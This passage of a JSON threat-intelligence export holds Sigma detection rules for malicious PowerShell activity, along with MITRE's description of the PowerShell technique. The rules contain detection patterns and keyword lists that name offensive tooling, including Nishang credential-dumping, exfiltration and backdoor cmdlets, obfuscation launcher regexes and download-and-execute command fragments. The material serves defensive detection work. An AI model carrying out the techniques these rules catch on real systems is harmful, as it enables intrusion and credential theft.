                            "raw": "author: John Lambert (idea), Florian Roth (Nextron Systems)\ndate: 2017/04/09\ndescription: Detects PowerShell calling a credential prompt\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: PromptForCredential\nfalsepositives:\n- Unknown\nid: ca8b77a9-d499-4095-b793-5d5f330d450e\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://twitter.com/JohnLaTwC/status/850381440629981184\n- https://t.co/ezOTGy1a1G\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Credential Prompt\n",
                            "sigma:id": "ca8b77a9-d499-4095-b793-5d5f330d450e",
                            "title": "PowerShell Credential Prompt",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e54f5149-6ba3-49cf-b153-070d24679126",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|re: (?i).*&&set.*(\\{\\d\\}){2,}\\\\\"\\s+?-f.*&&.*cmd.*/c\nfalsepositives:\n- Unknown\nid: e54f5149-6ba3-49cf-b153-070d24679126\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - PowerShell\n",
                            "sigma:id": "e54f5149-6ba3-49cf-b153-070d24679126",
                            "title": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|re: (?i).*&&set.*(\\{\\d\\}){2,}\\\\\"\\s+?-f.*&&.*cmd.*/c\nfalsepositives:\n- Unknown\nid: f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: e54f5149-6ba3-49cf-b153-070d24679126\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - PowerShell Module\n",
                            "sigma:id": "f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6",
                            "title": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f772cee9-b7c2-4cb2-8f07-49870adc02e0",
                        "lookup_data": {
                            "description": "Detects Commandlet names and arguments from the Nishang exploitation framework",
                            "raw": "author: Alec Costello\ndate: 2019/05/16\ndescription: Detects Commandlet names and arguments from the Nishang exploitation\n  framework\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - Add-ConstrainedDelegationBackdoor\n    - Copy-VSS\n    - Create-MultipleSessions\n    - DataToEncode\n    - DNS_TXT_Pwnage\n    - Do-Exfiltration-Dns\n    - Download_Execute\n    - Download-Execute-PS\n    - DownloadAndExtractFromRemoteRegistry\n    - DumpCerts\n    - DumpCreds\n    - DumpHashes\n    - Enable-DuplicateToken\n    - Enable-Duplication\n    - Execute-Command-MSSQL\n    - Execute-DNSTXT-Code\n    - Execute-OnTime\n    - ExetoText\n    - exfill\n    - ExfilOption\n    - FakeDC\n    - FireBuster\n    - FireListener\n    - 'Get-Information '\n    - Get-PassHints\n    - Get-Web-Credentials\n    - Get-WebCredentials\n    - Get-WLAN-Keys\n    - HTTP-Backdoor\n    - Invoke-AmsiBypass\n    - Invoke-BruteForce\n    - Invoke-CredentialsPhish\n    - Invoke-Decode\n    - Invoke-Encode\n    - Invoke-Interceptor\n    - Invoke-JSRatRegsvr\n    - Invoke-JSRatRundll\n    - Invoke-MimikatzWDigestDowngrade\n    - Invoke-NetworkRelay\n    - Invoke-PowerShellIcmp\n    - Invoke-PowerShellUdp\n    - Invoke-Prasadhak\n    - Invoke-PSGcat\n    - Invoke-PsGcatAgent\n    - Invoke-SessionGopher\n    - Invoke-SSIDExfil\n    - LoggedKeys\n    - Nishang\n    - NotAllNameSpaces\n    - Out-CHM\n    - OUT-DNSTXT\n    - Out-HTA\n    - Out-RundllCommand\n    - Out-SCF\n    - Out-SCT\n    - Out-Shortcut\n    - Out-WebQuery\n    - Out-Word\n    - Parse_Keys\n    - Password-List\n    - Powerpreter\n    - Remove-Persistence\n    - Remove-PoshRat\n    - Remove-Update\n    - Run-EXEonRemote\n    - Set-DCShadowPermissions\n    - Set-RemotePSRemoting\n    - Set-RemoteWMI\n    - Shellcode32\n    - Shellcode64\n    - StringtoBase64\n    - TexttoExe\nfalsepositives:\n- Unknown\nid: f772cee9-b7c2-4cb2-8f07-49870adc02e0\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/16\nreferences:\n- https://github.com/samratashok/nishang\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious Nishang PowerShell Commandlets\n",
                            "sigma:id": "f772cee9-b7c2-4cb2-8f07-49870adc02e0",
                            "title": "Malicious Nishang PowerShell Commandlets",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "de41232e-12e8-49fa-86bc-c05c7e722df9",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell download command",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell download command\ndetection:\n  condition: all of selection_*\n  selection_function:\n    ContextInfo|contains:\n    - .DownloadFile(\n    - .DownloadString(\n  selection_webclient_:\n    ContextInfo|contains: System.Net.WebClient\nfalsepositives:\n- PowerShell scripts that download content from the Internet\nid: de41232e-12e8-49fa-86bc-c05c7e722df9\nlevel: medium\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/20\nrelated:\n- id: 65531a81-a694-4e31-ae04-f8ba5bc33759\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Download - PoshModule\n",
                            "sigma:id": "de41232e-12e8-49fa-86bc-c05c7e722df9",
                            "title": "Suspicious PowerShell Download - PoshModule",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f62176f3-8128-4faa-bf6c-83261322e5eb",
                        "lookup_data": {
                            "description": "Detects keywords from well-known PowerShell exploitation frameworks",
                            "raw": "author: Sean Metcalf (source), Florian Roth (Nextron Systems)\ndate: 2017/03/05\ndescription: Detects keywords from well-known PowerShell exploitation frameworks\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - AdjustTokenPrivileges\n    - IMAGE_NT_OPTIONAL_HDR64_MAGIC\n    - Microsoft.Win32.UnsafeNativeMethods\n    - ReadProcessMemory.Invoke\n    - SE_PRIVILEGE_ENABLED\n    - LSA_UNICODE_STRING\n    - MiniDumpWriteDump\n    - PAGE_EXECUTE_READ\n    - SECURITY_DELEGATION\n    - TOKEN_ADJUST_PRIVILEGES\n    - TOKEN_ALL_ACCESS\n    - TOKEN_ASSIGN_PRIMARY\n    - TOKEN_DUPLICATE\n    - TOKEN_ELEVATION\n    - TOKEN_IMPERSONATE\n    - TOKEN_INFORMATION_CLASS\n    - TOKEN_PRIVILEGES\n    - TOKEN_QUERY\n    - Metasploit\n    - Mimikatz\nfalsepositives:\n- Unknown\nid: f62176f3-8128-4faa-bf6c-83261322e5eb\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://adsecurity.org/?p=2921\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious PowerShell Keywords\n",
                            "sigma:id": "f62176f3-8128-4faa-bf6c-83261322e5eb",
                            "title": "Malicious PowerShell Keywords",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50",
                        "lookup_data": {
                            "description": "Detects the creation of a remote thread from a Powershell process to another process",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/06\ndescription: Detects the creation of a remote thread from a Powershell process to\n  another process\ndetection:\n  condition: selection and not 1 of filter*\n  filter_powershell:\n    SourceParentImage: C:\\Windows\\System32\\CompatTelRunner.exe\n  selection:\n    SourceImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Unknown\nid: eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50\nlevel: high\nlogsource:\n  category: create_remote_thread\n  definition: Note that you have to configure logging for CreateRemoteThread in Symson\n    config\n  product: windows\nmodified: 2022/08/12\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Accessing WinAPI in PowerShell. Code Injection\n",
                            "sigma:id": "eeb2e3dc-c1f4-40dd-9bd5-149ee465ad50",
                            "title": "Accessing WinAPI in PowerShell. Code Injection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "779c8c12-0eb1-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of stdin to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of stdin to execute PowerShell\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|re: .*cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$?\\{?input\\}?|noexit).+\"\nfalsepositives:\n- Unknown\nid: 779c8c12-0eb1-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/03\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation STDIN+ Launcher - Powershell\n",
                            "sigma:id": "779c8c12-0eb1-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation STDIN+ Launcher - Powershell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "d7bcd677-645d-4691-a8d4-7a5602b780d1",
                        "lookup_data": {
                            "description": "Detects the PowerShell command lines with special characters",
                            "raw": "author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton\n  (fp)\ndate: 2020/10/15\ndescription: Detects the PowerShell command lines with special characters\ndetection:\n  condition: (1 of selection_*) and not filter_amazonSSM and not (selection_3 and\n    filter_windef_atp)\n  filter_amazonSSM:\n    ParentImage: C:\\Program Files\\Amazon\\SSM\\ssm-document-worker.exe\n  filter_windef_atp:\n    CommandLine|contains:\n    - new EventSource(\"Microsoft.Windows.Sense.Client.Management\"\n    - public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);\n  selection_1:\n    CommandLine|re: .*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\\+.*\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  selection_2:\n    CommandLine|re: .*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\\{.*\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  selection_3:\n    CommandLine|re: .*\\{.*\\{.*\\{.*\\{.*\\{.*\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  selection_4:\n    CommandLine|re: .*\\^.*\\^.*\\^.*\\^.*\\^.*\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  selection_5:\n    CommandLine|re: .*`.*`.*`.*`.*`.*\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Unlikely\n- Amazon SSM Document Worker\n- Windows Defender ATP\nid: d7bcd677-645d-4691-a8d4-7a5602b780d1\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/18\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=64\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Command Line\n",
                            "sigma:id": "d7bcd677-645d-4691-a8d4-7a5602b780d1",
                            "title": "Suspicious PowerShell Command Line",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3ceb2083-a27f-449a-be33-14ec1b7cc973",
                        "lookup_data": {
                            "description": "Detects Silence EmpireDNSAgent as described in the Group-IP report",
                            "raw": "author: Alina Stepchenkova, Group-IB, oscd.community\ndate: 2019/11/01\ndescription: Detects Silence EmpireDNSAgent as described in the Group-IP report\ndetection:\n  condition: empire and dnscat\n  dnscat:\n    ScriptBlockText|contains|all:\n    - set type=$LookupType`nserver\n    - $Command | nslookup 2>&1 | Out-String\n    - New-RandomDNSField\n    - '[Convert]::ToString($SYNOptions, 16)'\n    - $Session.Dead = $True\n    - $Session[\"Driver\"] -eq\n  empire:\n    ScriptBlockText|contains|all:\n    - System.Diagnostics.Process\n    - Stop-Computer\n    - Restart-Computer\n    - Exception in execution\n    - $cmdargs\n    - Close-Dnscat2Tunnel\nfalsepositives:\n- Unknown\nid: 3ceb2083-a27f-449a-be33-14ec1b7cc973\nlevel: critical\nlogsource:\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\n  service: powershell\nmodified: 2022/10/05\nreferences:\n- https://www.group-ib.com/resources/threat-research/silence_2.0.going_global.pdf\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1071.004\n- attack.t1572\n- attack.impact\n- attack.t1529\n- attack.g0091\n- attack.s0363\ntitle: Silence.EDA Detection\n",
                            "sigma:id": "3ceb2083-a27f-449a-be33-14ec1b7cc973",
                            "title": "Silence.EDA Detection",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
                        "lookup_data": {
                            "description": "Detects presence of a potentially xor encoded powershell command",
                            "raw": "author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov,\n  oscd.community, Nasreddine Bencherchali\ndate: 2018/09/05\ndescription: Detects presence of a potentially xor encoded powershell command\ndetection:\n  condition: all of selection_*\n  selection_cli_other:\n    CommandLine|contains:\n    - ForEach\n    - for(\n    - 'for '\n    - '-join '\n    - -join'\n    - -join\"\n    - -join`\n    - ::Join\n    - '[char]'\n  selection_cli_xor:\n    CommandLine|contains: bxor\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  - Description: Windows PowerShell\n  - Product: PowerShell Core 6\nfalsepositives:\n- Unknown\nid: bb780e0c-16cf-4383-8383-1e5471db6cf9\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=65\n- https://redcanary.com/blog/yellow-cockatoo/\n- https://zero2auto.com/2020/05/19/netwalker-re/\n- https://mez0.cc/posts/cobaltstrike-powershell-exec/\nrelated:\n- id: 5b572dcf-254b-425c-a8c5-d9af6bea35a6\n  type: obsoletes\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1059.001\n- attack.t1140\n- attack.t1027\ntitle: Suspicious XOR Encoded PowerShell Command\n",
                            "sigma:id": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
                            "title": "Suspicious XOR Encoded PowerShell Command",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c72aca44-8d52-45ad-8f81-f96c4d3c755e",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via Stdin in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/12\ndescription: Detects Obfuscated Powershell via Stdin in Scripts\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|re: (?i).*(set).*&&\\s?set.*(environment|invoke|\\$?\\{?input).*&&.*\"\nfalsepositives:\n- Unknown\nid: c72aca44-8d52-45ad-8f81-f96c4d3c755e\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 86b896ba-ffa1-4fea-83e3-ee28a4c915c7\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Stdin - PowerShell Module\n",
                            "sigma:id": "c72aca44-8d52-45ad-8f81-f96c4d3c755e",
                            "title": "Invoke-Obfuscation Via Stdin - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8c521530-5169-495d-a199-0a3a881ad24e",
                        "lookup_data": {
                            "description": "Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.",
                            "raw": "author: Sami Ruohonen\ndate: 2018/07/24\ndescription: Detects writing data into NTFS alternate data streams from powershell.\n  Needs Script Block Logging.\ndetection:\n  condition: all of selection*\n  selection_content:\n    ScriptBlockText|contains:\n    - set-content\n    - add-content\n  selection_stream:\n    ScriptBlockText|contains: -stream\nfalsepositives:\n- Unknown\nid: 8c521530-5169-495d-a199-0a3a881ad24e\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- http://www.powertheshell.com/ntfsstreams/\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1564.004/T1564.004.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1564.004\n- attack.execution\n- attack.t1059.001\ntitle: NTFS Alternate Data Stream\n",
                            "sigma:id": "8c521530-5169-495d-a199-0a3a881ad24e",
                            "title": "NTFS Alternate Data Stream",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "db92dd33-a3ad-49cf-8c2c-608c3e30ace0",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Clip.exe in Scripts\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|re: (?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*\nfalsepositives:\n- Unknown\nid: db92dd33-a3ad-49cf-8c2c-608c3e30ace0\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Clip - Powershell\n",
                            "sigma:id": "db92dd33-a3ad-49cf-8c2c-608c3e30ace0",
                            "title": "Invoke-Obfuscation Via Use Clip - Powershell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "20e5497e-331c-4cd5-8d36-935f6e2a9a07",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via COMPRESS OBFUSCATION\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|contains:\n    - system.io.compression.deflatestream\n    - system.io.streamreader\n    ScriptBlockText|contains|all:\n    - new-object\n    - text.encoding]::ascii\n    ScriptBlockText|endswith: readtoend\nfalsepositives:\n- Unknown\nid: 20e5497e-331c-4cd5-8d36-935f6e2a9a07\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation COMPRESS OBFUSCATION - PowerShell\n",
                            "sigma:id": "20e5497e-331c-4cd5-8d36-935f6e2a9a07",
                            "title": "Invoke-Obfuscation COMPRESS OBFUSCATION - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "970a3432-3237-47ad-bcca-7d8cbb217736",
                        "lookup_data": {
                            "mitre-attack-id": "T1059.001",
                            "mitre-cti:description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
                            "mitre-cti:name": "PowerShell",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Mayuresh Dani, Qualys', 'Praetorian'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736', 'created': '2020-03-09T13:48:55.078Z', 'x_mitre_version': '1.2', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1059.001', 'url': 'https://attack.mitre.org/techniques/T1059/001'}, {'source_name': 'Microsoft PSfromCsharp APR 2014', 'url': 'https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/', 'description': 'Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.'}, {'source_name': 'SilentBreak Offensive PS Dec 2015', 'url': 'https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/', 'description': 'Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.'}, {'source_name': 'FireEye PowerShell Logging 2016', 'url': 'https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html', 'description': 'Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.'}, {'source_name': 'Github PSAttack', 'url': 'https://github.com/jaredhaight/PSAttack', 'description': 'Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.'}, {'source_name': 'inv_ps_attacks', 'url': 'https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/', 'description': 'Hastings, M. (2014, July 16). Investigating PowerShell Attacks. Retrieved December 1, 2021.'}, {'source_name': 'Malware Archaeology PowerShell Cheat Sheet', 'url': 'http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf', 'description': 'Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.'}, {'source_name': 'TechNet PowerShell', 'url': 'https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx', 'description': 'Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.'}, {'source_name': 'Sixdub PowerPick Jan 2016', 'url': 'http://www.sixdub.net/?p=367', 'description': 'Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': \"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\\n\\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\\n\\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\\n\\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\", 'modified': '2022-04-19T20:25:48.646Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'PowerShell', 'x_mitre_detection': 'If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\\n\\nMonitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)\\n\\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.\\n\\nConsider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Script: Script Execution', 'Command: Command Execution', 'Process: Process Metadata', 'Process: Process Creation', 'Module: Module Load'], 'x_mitre_remote_support': True, 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation command parameters",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell invocation command parameters\ndetection:\n  condition: 1 of selection_* and not 1 of filter_*\n  filter_chocolatey:\n    ContextInfo|contains:\n    - (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\n    - Write-ChocolateyWarning\n  selection_convert_b64:\n    ContextInfo|contains|all:\n    - -nop\n    - ' -w '\n    - hidden\n    - ' -c '\n    - '[Convert]::FromBase64String'\n  selection_enc:\n    ContextInfo|contains|all:\n    - ' -w '\n    - hidden\n    - -ep\n    - bypass\n    - -Enc\n  selection_iex:\n    ContextInfo|contains|all:\n    - ' -w '\n    - hidden\n    - -noni\n    - -nop\n    - ' -c '\n    - iex\n    - New-Object\n  selection_iex_webclient:\n    ContextInfo|contains|all:\n    - iex\n    - New-Object\n    - Net.WebClient\n    - .Download\n  selection_reg:\n    ContextInfo|contains|all:\n    - powershell\n    - reg\n    - add\n    - HKCU\\software\\microsoft\\windows\\currentversion\\run\n  selection_webclient:\n    ContextInfo|contains|all:\n    - bypass\n    - -noprofile\n    - -windowstyle\n    - hidden\n    - new-object\n    - system.net.webclient\n    - .download\nfalsepositives:\n- Unknown\nid: 